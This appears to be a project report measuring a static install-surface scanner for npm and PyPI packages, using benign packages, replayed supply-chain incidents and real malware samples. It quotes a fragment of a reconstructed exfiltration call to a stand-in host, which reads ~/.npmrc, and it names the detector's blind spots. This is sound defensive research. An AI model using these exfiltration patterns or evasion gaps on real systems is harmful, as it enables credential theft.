# Install-surface ledger: validation experiment

> English | [中文](SURFACE-EXPERIMENT.zh.md)
>
> Question: if sift keeps only deterministic static analysis — no model calls —
> is the result usable, and how much is it worth? This is the measurement
> behind that question, run against published packages, with raw output kept
> outside the repository.

## What was built

`sift surface <tree>` reduces a tree to install-time capabilities with
`file:line` evidence, and `sift diff <a> <b>` reports what the install surface
gained or lost between two versions. Neither command calls a model, and neither
reads the target's `.env` or `sift-policy.toml`: the ledger is a pure function
of the tree (`src/surface.rs`, `src/diff.rs`, `Config::for_reader`).

Capabilities are fixed: `artifact`, `deps`, `execute`, `fs-write`, `hook`,
`network`, `secret`. Every entry carries a `trigger` (the entry point that can
run it), a `confidence` (`strong` = the line proves the capability, `weak` =
it only shows reach: an import, a URL literal, an env read), and a `scope`
(`production`, `ci`, `test`, `fixture`, `docs`). `production,ci` is the default
scope; hidden entries are always counted in the header and in
`hidden_by_scope`.

## Method

* Corpus: 21 published packages (11 npm, 10 PyPI) downloaded from
  `registry.npmjs.org` and `pypi.org` with `curl`, extracted with `tar` after
  rejecting absolute and `..` entries. **No package code was ever executed, no
  package manager was run, no build was performed.**
* Three incident replays: the real published *clean* version is the baseline,
  and the payload documented in public write-ups is re-applied on top of a copy
  (`ua-parser-js@0.7.29` preinstall download-execute, `eslint-scope@3.7.2`
  postinstall `~/.npmrc` exfiltration, `event-stream@3.3.6` injected
  `flatmap-stream` dependency). Malicious artefacts were never executed; the
  registries have removed all three from distribution, so the payloads are
  reconstructions while the surrounding tree is genuine.
* Two control diffs on routine releases: `express 4.18.1 → 4.18.2`,
  `requests 2.31.0 → 2.32.0`.

## Results

### 1. Completeness and cost

| package | candidates | scanned | unsupported | entries | strong | weak | hidden (scope) | time |
|---|---|---|---|---|---|---|---|---|
| npm-axios-1.6.0 | 68 | 66 | 2 | 7 | 7 | 0 | 5 | 122 ms |
| npm-esbuild-0.19.11 | 7 | 6 | 1 | 16 | 16 | 0 | 0 | 100 ms |
| npm-express-4.18.2 | 16 | 15 | 1 | 0 | 0 | 0 | 2 | 80 ms |
| npm-lodash-4.17.21 | 1054 | 1050 | 4 | 4 | 4 | 0 | 0 | 454 ms |
| npm-react-18.2.0 | 20 | 19 | 1 | 1 | 0 | 1 | 0 | 177 ms |
| npm-sharp-0.33.0 | 32 | 30 | 2 | 7 | 5 | 2 | 0 | 263 ms |
| npm-typescript-5.3.3 | 110 | 86 | 24 | 9 | 8 | 1 | 0 | 227 ms |
| npm-ua-parser-js-0.7.28 | 17 | 10 | 7 | 5 | 3 | 2 | 0 | 56 ms |
| pypi-click-8.1.7 | 133 | 72 | 61 | 50 | 25 | 25 | 11 | 345 ms |
| pypi-cryptography-42.0.6 | 405 | 304 | 101 | 31 | 13 | 18 | 120 | 1.6 s |
| pypi-flask-3.0.0 | 233 | 114 | 119 | 14 | 0 | 14 | 13 | 331 ms |
| pypi-httpx-0.26.0 | 69 | 64 | 5 | 21 | 14 | 7 | 839 | 354 ms |
| pypi-numpy-1.26.4 | 7109 | 3422 | 3687 | 200 (capped) | 143 | 57 | 147 | 12.9 s |
| pypi-pydantic-2.5.3 | 280 | 266 | 14 | 102 | 88 | 14 | 26 | 1.9 s |
| pypi-pyyaml-6.0.1 | 636 | 49 | 587 | 36 | 33 | 3 | 5 | 230 ms |
| pypi-requests-2.32.0 | 49 | 37 | 12 | 16 | 6 | 10 | 157 | 220 ms |
| pypi-rich-13.7.0 | 83 | 80 | 3 | 13 | 11 | 2 | 0 | 462 ms |
| pypi-setuptools-69.0.3 | 520 | 390 | 130 | 200 (capped) | 136 | 64 | 260 | 1.7 s |

* Median: **7 entries, ~230 ms** per package. No key, no network, no cache.
* Install hooks declared in `package.json` (`preinstall`, `install`,
  `postinstall`, `prepare`, `pack`): **5/5 found** (axios `prepare`, esbuild
  `postinstall`, sharp `install`, plus both replay payloads).
* After the detector fixes below, **0 of 769 visible entries** failed the
  self-consistency check (does the evidence line actually contain the token
  class the entry claims).

### 2. False positives found by the corpus, then fixed

The first run over the corpus produced 40 % more entries than the final one.
Every reduction came from a real defect, not from tuning thresholds:

| defect | example | before → after |
|---|---|---|
| Package metadata read as dependency sources | `"homepage": "https://github.com/..."` → `deps/remote-dep-source` | ua-parser-js 8 deps → 1 |
| Metadata URLs read as network capability | `"author"`, `"bugs"`, `"funding"` URLs → `network/remote-url` | axios 19 network → 6 |
| Identifier substrings matched as process spawns | `def detect_subsystem(...)`, `class ColorSystem(...)` → `execute/process-spawn` | numpy 33 → 0 |
| Imports matched as strong network calls | `from urllib.parse import (` → `network/remote-fetch (strong)` | demoted to `weak` |

### 3. Incident replay: did the diff surface the payload?

| replay | diff result | what it showed |
|---|---|---|
| `ua-parser-js 0.7.28 → 0.7.29` | **added 3** | `hook/npm-preinstall`, `execute/download-execute`, `network/remote-fetch` on `package.json:150` |
| `eslint-scope 3.7.1 → 3.7.2` | **added 2** | `hook/npm-postinstall` on `package.json:23`, `network/remote-fetch` on `postinstall.js:5` (`https.request({ host: 'exfil.invalid' …`) |
| `event-stream 3.3.5 → 3.3.6` | **added 0** | **blind spot:** the injected `flatmap-stream` dependency is a registry dependency, and the ledger tracks only non-registry sources |
| control: `express 4.18.1 → 4.18.2` | added 0, removed 0 | routine patch release stays silent |
| control: `requests 2.31.0 → 2.32.0` | added 9, removed 9 | the release moved the package from a flat layout to `src/`, and the diff reports the moved lines because paths are part of the key |

### 4. Real malicious artifacts (public dataset samples)

The registries have removed the three replayed incidents, so those payloads are
reconstructions. To measure against **real artifacts**, three samples were taken
from the public [Datadog malicious-software-packages-dataset](https://github.com/DataDog/malicious-software-packages-dataset)
(Apache-2.0), which ships them as password-protected ZIPs (`infected`) so they
cannot be executed by accident. They were extracted read-only; nothing was run.

| sample | shape | ledger result |
|---|---|---|
| `exo-steal@5` (PyPI, malicious intent) | plain Python wallet stealer, 11 entries | **caught**: `network/remote-fetch` ×5 (Telegram exfil), `secret/env-access` ×3 (LOCALAPPDATA/APPDATA/TEMP), `fs-write/file-write-op` (wallet ZIP), `hook/python-setup-command` |
| `debug@4.4.2` (npm, compromised 2025-09-08) | `src/index.js` 314 → **76 754 bytes**, 3 235 generated `_0x` identifiers, one 76 438-character line | **invisible to token detectors** (2 weak entries only); `diff 4.4.1 → 4.4.2` returned **0 added / 0 removed, exit 0** |
| `node-ipc@12.0.1` (npm, compromised) | `node-ipc.cjs` 37 308 → **117 315 bytes**, 4 187 generated identifiers | same: payload invisible; `diff 12.0.0 → 12.0.1` reported only a removed `prepare` hook |

That result — a real, high-profile npm compromise invisible to a token-level
ledger — produced the one implementation change of this round: a **file-shape
audit**. Obfuscation defeats tokens, but it cannot hide shape, so a file with
≥ 100 generated `_0x`-style identifiers is reported as
`artifact/obfuscated_source` (strong), and a generated line of ≥ 20 000
characters as `artifact/minified_source` (weak), with its metrics as evidence.

After the change:

| sample | ledger result | diff result |
|---|---|---|
| `debug 4.4.1 → 4.4.2` | `artifact strong obfuscated_source src/index.js bytes=76754 lines=12 max_line=76438 generated_idents=3235` | **exit 1, added 1**, pointing at the payload file |
| `node-ipc 12.0.0 → 12.0.1` | `artifact strong obfuscated_source node-ipc.cjs bytes=117315 lines=1271 max_line=80078 generated_idents=4187` | **exit 1, added 1** |

Precision check: across the 21-package benign corpus the shape signal fires
exactly **once** — `setuptools/config/_validate_pyproject/fastjsonschema_validations.py`
(28 283-character generated line) — and as `weak`, not `strong`.

### 5. Limits the corpus exposed (each with a cheap fix)

1. **AST call evidence carries the callee, not the arguments.** A JavaScript
   call is recorded as `fs.readFileSync` or `https.request`, so a payload's
   target path (`~/.npmrc`) is invisible: the `eslint-scope` replay shows
   `network` but not `secret`. Fix: record the full line (or the argument list)
   for call locations; the line-based dehydrators already do this and the
   truncation machinery already exists upstream.
2. **Dependency injection is invisible.** `event-stream@3.3.6` added a benign
   registry dependency that contained the payload — the most common npm
   attack shape, and neither the ledger nor the diff notices it. Fix: record
   declared dependencies (`name@spec`) as `deps` entries from a real manifest
   parse instead of line tokens.
3. **Vendored and generated trees dominate large sdists.** numpy: 7109
   candidates, 3687 unsupported, ~1960 `hook` entries inside `vendored-meson/`.
   Fix: extend `DEFAULT_IGNORES` with `vendored*` and let `--limit` (default
   200, already truncating visibly) stay the backstop.
4. **Directory refactors look like surface changes.** The `requests` control
   diff reports 9 added / 9 removed purely because paths moved. Fix: fall back
   to `(capability, basename, text)` matching when a key is unmatched.

## Conclusion

Static-only sift is viable: on published packages it produces a small,
deterministic, evidence-anchored install-surface ledger in a few hundred
milliseconds with no key, no network, and no execution, and it surfaces the
payload in two of three replayed incidents as a **diff against the previous
version**. Its value is not "risk score" but "what will this thing do at
install time, and what changed since the version I already trust".

The measurement also says what the value depends on. On real artifacts the
ledger caught an unobfuscated stealer outright, and was blind to two real
obfuscated compromises until the evidence model was extended from *tokens* to
*tokens plus shape*. The binding constraints are therefore the evidence model
(callee without arguments, no file-shape metrics), the dependency model
(sources but not the dependency set), and the scope defaults
(docs/tests/vendored trees) — not the number of rules. Shape is now in; the
other three are structural fixes, not tuning.

## Reproduce

```sh
# corpus + replays (downloads only, never executes package code)
/tmp/sift-lab/harness.sh
/tmp/sift-lab/run_surfaces.sh

# single package
sift surface ./pkg --capability network,execute --fail-on execute
sift diff ./pkg-1.2.3 ./pkg-1.4.0 --format json
```
